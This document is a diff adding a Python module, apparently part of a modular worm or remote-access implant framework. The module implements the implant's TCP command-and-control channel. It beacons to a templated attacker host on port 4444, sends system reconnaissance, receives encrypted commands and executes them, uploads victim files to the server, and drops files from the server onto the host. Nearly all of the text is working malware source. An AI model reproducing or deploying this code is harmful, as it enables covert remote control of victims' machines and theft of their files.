@@ -1,0 +1,244 @@
+#!name##Tcp_v1
+#!types##module
+#!info##TCP Communication Module. Sends and receives messages in JSON format encoded with Base64. Allows you to send and recive multiple files running in the background. The main socket is not occupied.
+#!reqSMod##Chameleon
+#!reqVar##IP_ADDR##Host address.##str
+#!reqVar##PORT##Host port number##int
+#!setVar##PORT##4444##int
+#!reqVar##FORMAT_CODE##Message encoding format.##str
+#!reqVar##TCP_SOCK_TO##Socket Timeout##int
+#!reqVar##RAW_LEN##raw_len vaule in bytes##int
+#!reqVar##TCP_SOCK_SEPARATOR##Message splitting separator##str
+
+import socket
+import json
+import string
+import os
+import platform
+from threading import Thread
+from random import randint
+from time import sleep
+from typing import Union
+from random import randint
+
+class Tcp_v1(Thread):
+    MTYPES = "conn"
+    def __init__(self, worm: object):
+        super().__init__()
+        self.worm = worm
+        self.addr = ("{{IP_ADDR}}", {{PORT}})
+        self.format_code = "{{FORMAT_CODE}}"
+        self.cham = Chameleon(self.format_code)
+        self.raw_len = {{RAW_LEN}}
+        self.is_conn = False
+        self.sep = "{{TCP_SOCK_SEPARATOR}}"
+        self.chars = string.ascii_letters
+        self.to_send = {}
+        self.id_len = 25
+        self._system = {"system" : f"{platform.uname().system}#{platform.uname().release}"}
+    
+    @property
+    def recon(self) -> dict:
+        return self._system
+    
+    def _conn(self) -> bool:
+        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            self.client.connect(self.addr)
+            self.is_conn = True
+            return True
+        except (ConnectionError, ConnectionAbortedError, ConnectionResetError) as e:
+            self.is_conn = False
+            return False
+    
+    def conn(self) -> None:
+        while self.worm.working:
+            if self._conn():
+                try:
+                    self.worm.recon()
+                except:
+                    pass
+                self.recive_msg()
+                self.disconnect()
+            sleep(randint(3, 8))
+    
+    def disconnect(self) -> None:
+        self.is_conn = False
+        try:
+            self.client.close()
+        except:
+            pass
+
+    
+    def unpack(self, data: str) -> dict:
+        out = []
+        for d in data.split(self.sep):
+            if d == "" or d == " ":
+                continue
+            out.append(d)
+        clean = []
+        for d in out:
+            try:
+                clean.append(json.loads(d))
+            except:
+                continue
+        return clean
+    
+    def recive_raw(self) -> Union[str, None]:
+        data = b""
+        while self.worm.working:
+            try:
+                recv = self.client.recv(self.raw_len)
+            except (ConnectionAbortedError, ConnectionResetError, ConnectionError):
+                return None
+            if recv:
+                if len(recv) < self.raw_len:
+                    data += recv
+                    break
+                else:
+                    data += recv
+            else:
+                return None
+        try:
+            data = self.cham.decrypt(data)
+            data = self.unpack(data)
+        except:
+            return [{"cmd": "empty"}]
+        return data
+    
+    def recive_msg(self) -> None:
+        while self.worm.working:
+            cmd = self.recive_raw()
+            if not cmd:
+                return
+            else:
+                for c in cmd:
+                    self.worm.exec_cmd(c)
+    
+    def send_data(self, data: dict) -> None:
+        if not self.is_conn:
+            return
+        try:
+            data = json.dumps(data)
+        except json.JSONDecodeError:
+            return
+        data = self.sep + data
+        data = self.cham.encrypt(data)
+        sleep(0.1)
+        self.client.sendall(data)
+    
+    def send_msg(self, text: str) -> None:
+        data = {"types" : "msg", "data" : text}
+        self.send_data(data)
+    
+    def gen_id(self, count: int = 25) -> str:
+        idd = ""
+        while len(idd) < count:
+            idd += self.chars[randint(0, len(self.chars) - 1)]
+        return idd
+        
+    
+    def send_file(self, fpath: str, name: str = None, types: str = None) -> None:
+        if not os.path.exists(fpath):
+            return
+        flen = os.stat(fpath).st_size
+        file_id = self.gen_id(self.id_len)
+        if not name:
+            name = os.path.basename(fpath)
+        data = {"name" : name, "file_len": flen, "file_id" : file_id, "types" : types}
+        self.to_send[file_id] = fpath
+        self.send_data({"types" : "down", "data" : data})
+    
+    def get_file(self, name: str) -> None:
+        fpath = os.path.join(os.getcwd(), name)
+        if not os.path.exists(fpath):
+            self.send_msg("Error: File does not exists")
+            return
+        self.send_file(fpath, name)
+    
+    
+    
+    def _download_file(self, fname: str, port: str, flen: str) -> None:
+        try:
+            port = int(port)
+            flen = int(flen)
+        except ValueError:
+            return
+        
+        xsock = self.make_xsock(self.addr[0], port)
+        if not xsock:
+            return
+        data = b""
+        while len(data) < flen:
+            try:
+                recv = xsock.recv(flen)
+            except:
+                return
+            if not recv:
+                return
+            else:
+                data += recv
+        try:
+            with open(os.path.join(os.getcwd(), fname), "wb") as file:
+                file.write(data)
+        except:
+            pass
+    
+    def download_file(self, cmd: dict) -> None:
+        down = Thread(target=self._download_file, args=(str(cmd.get("fname")), str(cmd.get("port")), str(cmd.get("flen"))), daemon=True)
+        down.start()
+        
+            
+    
+    def make_xsock(self, ip: str, port : int) -> Union[object, None]:
+        try:
+            xsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            xsock.connect((ip, port))
+            return xsock
+        except:
+            return None
+    
+    def _send_file(self, data: dict) -> None:
+        fpath = self.to_send.get(data.get("file_id"))
+        if not fpath:
+            return
+        ip = data.get("ip")
+        try:
+            port = int(data.get("port"))
+        except:
+            return
+        xsock = self.make_xsock(ip, port)
+        if not xsock:
+            return
+        try:
+            with open(fpath, "rb") as f:
+                xsock.sendfile(f, 0)
+        except:
+            return
+        del self.to_send[data.get("file_id")]
+    
+    def exec_cmd(self, cmd: dict) -> None:
+        com = cmd.get("cmd")
+        if not com:
+            return
+        match com:
+            case "packer":
+                self._send_file(cmd)
+            case "get":
+                self.get_file(str(cmd.get("data")))
+            case "down":
+                self.download_file(cmd)
+    
+    def help(self):
+        h = f"{'get <file_name>':<25}Grab file and send to server\n"
+        return h
+            
+    
+    def run(self) -> None:
+        self.conn()
+
+    
+    
+
+
+
